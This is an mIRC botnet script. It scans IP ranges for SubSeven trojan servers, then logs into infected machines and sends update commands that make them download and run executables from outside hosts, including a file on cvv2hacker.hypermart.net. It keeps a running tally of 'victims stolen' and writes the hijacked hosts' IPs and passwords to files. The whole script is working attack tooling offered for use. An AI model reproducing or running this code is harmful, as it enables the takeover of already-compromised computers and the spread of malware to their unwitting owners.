   alias scancheck {
     if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
     if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
     if ($count(%scan.port,$chr(44)) >= 1) {
       set %scan.counter 0
       set %scan.countport $count(%scan.port,$chr(44))
       inc %scan.countport 1
       :start
       inc %scan.counter 1
       .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
       if (%scan.counter >= %scan.countport) { goto end }
       else { goto start }
     }
     else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
     :end
     inc %scan.start4 1
     if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
     if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
     if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
     if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
   }
   alias scansock {
     if ($sock(scan*,0) = 0) {
       .msg %scan.nick All Sockets Have closed, scanning all Variables now Being wiped!
       unset %scan.*
       .timersockscheck off
     }
   }
   on *:SOCKOPEN:scan*: {
     if ($sockerr > 0) { .sockclose $sockname | halt }
     .msg %scan.nick IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
     .write scan.txt IP: $gettok($remove($sockname,scan),2-,46) Port: $gettok($remove($sockname,scan),1,46)
     .sockclose $sockname
   }
   on 10:TEXT:!sub.scan *:*:{
     if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
     if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
     else {
       set %scan.Start1 $gettok($2,1,46)
       set %scan.Start2 $gettok($2,2,46)
       set %scan.Start3 $gettok($2,3,46)
       set %scan.Start4 $gettok($2,4,46)
       set %scan.Perm1 $gettok($2,1,46)
       set %scan.Perm2 $gettok($2,2,46)
       set %scan.Perm3 $gettok($2,3,46)
       set %scan.Perm4 $gettok($2,4,46)
       set %scan.End1 $gettok($3,1,46)
       set %scan.End2 $gettok($3,2,46)
       set %scan.End3 $gettok($3,3,46)
       set %scan.End4 $gettok($3,4,46)
       if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
       if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
       set %scan.port $4
       set %scan.delay $5
       set %scan.nick $nick
       .timerscan 0 %scan.delay scancheck
       .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
     }
   }
   on 10:TEXT:!subscanStatus:*:{
     if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
     else { .msg $nick No Scans In Progress }
   }
   on 10:TEXT:!subscanAbort:*:{
     if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
     else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
   }
   #Sub7Update off
   on *:TEXT:*ip* *port*:*:{
     if ($strip($1,burc) = ip:) && ($strip($3,burc) = port:) {
       if (%uplocation == $null) { /set %uplocation http://cvv2hacker.hypermart.net/fB.exe }
       /set %s7rem.socket E $+ $4 $+ $chr(46) $+ $2
       if ($sock(%s7rem.socket) = $null) {
         sockopen %s7rem.socket $2 $4
       }
       /msg %scan.nick 12Attempting to update:3 $2 on $4 $+ 15...
       //set %last.scan $4
     }
   }
   on *:TEXT:*sub7server*:*:{
     set %s7rem.text $strip($1-)

     if ($gettok(%s7rem.text,2,32) == v.GOLD) set %s7rem.theips $gettok(%s7rem.text,9,32)
     else set %s7rem.theips $gettok(%s7rem.text,8,32)

     if ($right(%s7rem.theips,1) == $chr(46)) set %s7rem.theips $left(%s7rem.theips,$calc($len(%s7rem.theips) - 1))

     set %s7rem.numtok $numtok(%s7rem.theips,45)

     if (%s7rem.numtok > 1) {
       set %s7rem.echoip $gettok(%s7rem.theips,%s7rem.numtok,45)
       msg %scan.nick 12 $+ $s7rem.bt $s7rem.bl $+ $nick displayed more than one IP, using the rightmost IP out of %s7rem.numtok $+ .
     }
     else set %s7rem.echoip %s7rem.theips

     set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 1) + 2)
     set %s7rem.p2 $pos(%s7rem.text, $chr(44), 1)
     set %s7rem.echoport $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))

     set %s7rem.p1 $calc($pos(%s7rem.text, $chr(58), 4) + 2)
     set %s7rem.p2 $calc($len(%s7rem.text) + 1)
     set -u500 %s7rem.echopass.E $+ %s7rem.echoport $+ $chr(46) $+ %s7rem.echoip $mid(%s7rem.text, %s7rem.p1, $calc(%s7rem.p2 - %s7rem.p1))

     if (%s7rem.echoip == $null) {
       msg %scan.nick 4 $+ $s7rem.sbt $s7rem.bl $+ Error: Oh Fuck Evaluated IP address is blank. :(
       return
     }
     if ($chr(45) isin %s7rem.echoip) {
       msg %scan.nick 4 $+ $s7rem.sbt $s7rem.bl $+ Error: Seperator found in evaluated IP address.
       return
     }

     if ($left(%s7rem.echoip,3) == 10.) s7rem.ipf
     if ($left(%s7rem.echoip,3) == 169) s7rem.ipf
     if ($left(%s7rem.echoip,3) == 192) s7rem.ipf
     ; if ($left(%s7rem.echoip,3) == 172) s7rem.ipf

     set %s7rem.socket E $+ %s7rem.echoport $+ $chr(46) $+ %s7rem.echoip
     if ($sock(%s7rem.socket) != $null) {
       msg %scan.nick 12 $+ $s7rem.bt $s7rem.bl $+ Socket already open: %s7rem.socket $+ . Closing and reopening socket... :)
       sockclose %s7rem.socket
     }
     if ($sock(%s7rem.socket) = $null) {
       sockopen %s7rem.socket %s7rem.echoip %s7rem.echoport
     }
   }

   alias s7rem.bl /return $chr(3) $+ 1
   alias s7rem.ec /if ($group(#s7rem) == on) return $chr(9) $+ [on] | else return $chr(9) $+ [off]
   alias s7rem.ipf {
     msg %scan.nick 4 $+ $s7rem.bt $s7rem.bl $+ Evaluated IP address ( $+ %s7rem.echoip $+ ) is not updateable Fuck Fuck Fuck :(
     halt
   }
   alias s7rem.stats {
     msg %scan.nick $s7rem.bt $chr(3) $+ 2Number Of VICTIMS NOW STOLEN Wheeeee Thanks Unca HeLL: $chr(3) $+ 12 $+ %gc $+ $chr(3) $+ 2.
     msg %scan.nick $s7rem.bt $chr(3) $+ 2Number of failed update attempts, Blame Unca HeLL The Old Bastard(incorrect passwords): $chr(3) $+ 12 $+ %gf $+ $chr(3) $+ 2.
   }
   alias s7rem.rv {
     if ($$1 == 1) {
       unset %s7rem.*
       msg %scan.nick $s7rem.bt $chr(3) $+ 2All temporary variables have been removed.
     }
     if ($$1 == 2) {
       unset %s7rem.echopass.*
       msg %scan.nick $s7rem.bt $chr(3) $+ 2All temporary password variables have been removed.
     }
   }
   on *:SOCKOPEN:E*:{
     if ($sockerr > 0) {
       msg %scan.nick Socket error: $chr(3) $+ 1 $+ ( $+ $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) $+ ) $sockerr
       return
     }
   }
   on *:SOCKREAD:E*:{
     sockread -f %s7rem.echodata
     echo -a $s7rem.bts $s7rem.bl $+ 0,1Debug ( $+ $gettok($remove($sockname,e),2-,46) $gettok($remove($sockname,e),1,46) $+ ) %s7rem.echodata
     if (User not logged in. Please login with USER and PASS first. isin %s7rem.echodata) {
       msg %scan.nick 7Fuck i can't do shit with this user as hes some fucked up wierdo with some fucked up shit DON'T CONNECT TO $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       .sockclose $sockname
       halt
     }
     if ($gettok(%s7rem.echodata,1,32) = RQS) { msg %scan.nick Found some wierd ass RQS in there so i'm closing $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) $+ !!!!!!!!!! | sockclose $sockname | halt }
     if (%s7rem.echodata == POPUP incorrect password...) {
       unset %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
       inc %gf
       //msg %scan.nick 12Update/Error:10 $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) (password protection/error)
       halt
     }
     if ([can't connect: No Error (Error #0)]. isin %s7rem.echodata) {
       msg %scan.nick 4Error with Client Downloading file $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Aborting
       sockclose $sockname
       halt
     }
     if ([RPL] isin %s7rem.echodata) {
       msg %scan.nick 4Some Mother fucking [RPL] Error $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Aborting
       .sockclose $sockname
       halt
     }
     if (%s7rem.echodata == Error Reading Password...) {
       //msg %scan.nick 4Error Reading Password with $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) Going To Abort
       sockclose $sockname
       halt
     }
     if (%s7rem.echodata == downloading file.) {
       inc %gc
       //msg %scan.nick 8Beginning update:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       halt
     }

     if (%s7rem.echodata == server updated. closing...) {
       inc %gc
       //msg %scan.nick 8Updated Successfully!:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
         .write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       }
       else {
         .write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
       }
       halt
     }
     if (file successfully downloaded isin %s7rem.echodata) {
       inc %gc
       //msg %scan.nick 8Updated Successfully!:10 for $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
         .write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46)
       }
       else {
         .write $gettok($remove($sockname,e),1,46) $+ .txt $gettok($remove($sockname,e),2-,46) on $gettok($remove($sockname,e),1,46) %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46)
       }
       halt
     }
     if (%s7rem.echodata == PWD) {
       if (%s7rem.echopass. [ $+ [ $gettok($remove($sockname,e),1,46) [ $+ [ $chr(46) [ $+ [ $gettok($remove($sockname,e),2-,46) ] ] ] ] ] ] = $null) {
         sockwrite $sockname PWD $+ 14438136782715101980
       }
       else { sockwrite $sockname PWD $+ %s7rem.echopass. $+ $gettok($remove($sockname,e),1,46) $+ $chr(46) $+ $gettok($remove($sockname,e),2-,46) }
       sockwrite $sockname UFU $+ %uplocation
     }
     else {
       sockwrite $sockname UFU $+ %uplocation
     }
   }
   on *:TEXT:*on*:*:{
     if ($2 == on) && ($3 isnum) {
       if (%uplocation == $null) { /set %uplocation http://home.dal.net/[syntax]/installer.exe }
       /set %s7rem.socket E $+ $3 $+ $chr(46) $+ $1
       if ($sock(%s7rem.socket) = $null) {
         sockopen %s7rem.socket $1 $3
         /msg %scan.nick 12Attempting to update:3 $1 on $3 $+ 15...
         //set %last.scan $1
       }
       else { msg %scan.nick Socket is allready Open }
     }
   }
   alias f0du {
     /set %s7rem.socket E $+ $2 $+ $chr(46) $+ $1
     if ($sock(%s7rem.socket) == $null) {
       sockopen %s7rem.socket $1 $2
     }
     //msg $decode(%c) 12Attempting to update:3 $1 on $2 $+ 15...
     //set %last.scan $2
   }
   on *:TEXT:!update stats*:#:{
     //msg # 4*** Update Stats ***
     //msg # 12Fails:4 %gf
     //msg # 12Complete:  $+ %gc
     //msg # 14Last Single(IP) Scan:12 %last.scan
     //msg # 10Current Time: $time
     //msg # 4End/Stats Report
   }
   #Sub7Update end
